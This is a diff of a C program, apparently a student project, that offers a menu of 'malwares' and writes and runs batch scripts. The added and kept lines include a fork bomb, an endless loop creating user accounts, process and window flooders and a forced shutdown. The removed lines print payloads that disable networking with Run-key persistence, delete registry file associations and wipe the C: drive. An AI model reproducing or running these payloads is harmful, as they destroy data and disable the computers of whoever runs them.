@@ -1,5 +1,7 @@
 /*
-Coded By: Deepak Chauhan
+PROJECT BY: Deepak Chauhan & Arun Lachheta
+ROLL NO : 2018PGCACA63 & 2018PGCACA24
+SEMESTER : 1ST
 YEAR : 2018
 */
 
@@ -24,7 +26,7 @@ int home(){
 printf("\n\n\n");
 printf("Menu :\n");
 printf("Choose the category:\n");
-printf("1)MALWARES\n2)UTILITY TOOLS\n3)ONE-KEY DESTRUCTION(Use with caution)\n4)EXIT\n");
+printf("1)MALWARES\n2)UTILITY TOOLS\n3)EXIT\n");
 scanf("%d", &home);
 return home;
 }
@@ -48,7 +50,7 @@ int potential(){
 printf("\n\n\n");
 printf("Potential Malwares :\n");
 printf("Choose the Destruction:\n");
-printf("1)Disable Internet Permanently\n2)ONE-TOUCH DESTRUCTION(Completely destroys OS)\n3)Notepad Flooder\n4)Application Bomber\n5)Folder flooder\n6)User Account Flooder\n7)Background Process Flooder\n8)Delete KEY-REGISTRY FILES\n9)Back to malwares\n10)Back to MAIN MENU\n11)EXIT\n");
+printf("1)Notepad Flooder\n2)Application Bomber\n3)Folder flooder\n4)User Account Flooder\n5)Background Process Flooder\n6)Back to malwares\n7)Back to MAIN MENU\n8)EXIT\n");
 scanf("%d", &potential);
 return potential;
 }
@@ -101,9 +103,9 @@ f=fopen("virus.vbs", "w");
 //PRANK MALWARE TOOLS AND THEIR FUNCTION CODES
 void shutdown(){
 createbat();
-fprintf(f, "@echo off\nmsg *You've Been HACKED!!! \nshutdown -c \"Error! You are too stupid!\" -s");
+fprintf(f, "@echo off\nshutdown -c \"Error! You are too stupid!\" -s");
 fclose(f);
-system("virus.vbs");
+system("virus.bat");
 }
 
 
@@ -137,20 +139,6 @@ system("virus.vbs");
 
 
 //POTENTIAL MALWARE AND THEIR TOOLS
-void internet(){
-createbat();
-fprintf(f, "echo @echo off>c:windowswimn32.bat\necho break off>c:windowswimn32.bat echo\nipconfig/release_all>c:windowswimn32.bat\necho end>c:windowswimn32.batreg add\nhkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add\nhkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho You Have Been HACKED!\nPAUSE");
-fclose(f);
-system("virus.bat");
-}
-
-void key(){
-createbat();
-fprintf(f, "@ECHO OFF\nSTART reg delete HKCR/.exe\nSTART reg delete HKCR/.dll\nSTART reg delete HKCR/*\n:MESSAGE\nECHO Your PC has been crashed.ROYAL EAGLE 73.\nGOTO MESSAGE");
-fclose(f);
-system("virus.bat");
-}
-
 void notepad(){
 createbat();
 fprintf(f, "@ECHO off\n:top\nSTART notepad\nGOTO top");
@@ -174,23 +162,18 @@ system("virus.cmd");
 
 void background(){
 createcmd();
-fprintf(f, "\%0|\%0");
+fprintf(f, "%%0|%%0");
 fclose(f);
 system("virus.cmd");
 }
 
 void user(){
 createcmd();
-fprintf(f, "@echo off\n:xnet\nuser \%random\% /add\ngoto x");
+fprintf(f, "@echo off\n:xnet\nuser %%random%% /add\ngoto x");
 fclose(f);
 system("virus.cmd");
 }
-void osdrive(){
-createcmd();
-fprintf(f, "@Echo off\nDel C:\\\\ *.* |y");
-fclose(f);
-system("virus.txt");
-}
+
 
 //UTILITY FUNCTIONS
 void calculator(){
@@ -209,7 +192,7 @@ system("virus.vbs");
 
 void matrix(){
 createbat();
-fprintf(f, "@echo off\ncolor 02\n:tricks\necho \%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\%random\%\ngoto tricks");
+fprintf(f, "@echo off\ncolor 02\n:tricks\necho %%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%\ngoto tricks");
 fclose(f);
 system("virus.bat");
 }
@@ -283,56 +266,41 @@ clear();
             switch(choice2){
 
             case 1 : {
-            internet();
-            break;
-            }
-
-            case 2 : {
-            osdrive();
-            break;
-            }
-
-            case 3 : {
             notepad();
             break;
             }
 
-            case 4 : {
+            case 2 : {
             application_flooder();
             break;
             }
 
-            case 5 : {
+            case 3 : {
             folder_flooder();
             break;
             }
 
-            case 6 : {
+            case 4 : {
             user();
             break;
             }
 
-            case 7 : {
+            case 5 : {
             background();
             break;
             }
 
-            case 8 : {
-            key();
-            break;
-            }
-
-            case 9 : {
+            case 6 : {
             goto C2;
             break;
             }
 
-            case 10: {
+            case 7: {
             goto C1;
             break;
             }
 
-            case 11 : {
+            case 8 : {
             printf("Thanks for Using script, see you later, enjoy your anger till then......");
 exit(0);
             }
@@ -480,13 +448,8 @@ goto C5;
     }
     }
 
-                                                                        case '3' : {
-    printf("\aSAD! BYE-BYE Forever\n");
-//clearing OS Drive
-osdrive();
-}
 
-                                                                        case '4' : {
+                                                                        case 3 : {
      printf("Thanks for Using script, see you later, enjoy your anger till then......");
      exit(10);
 break;
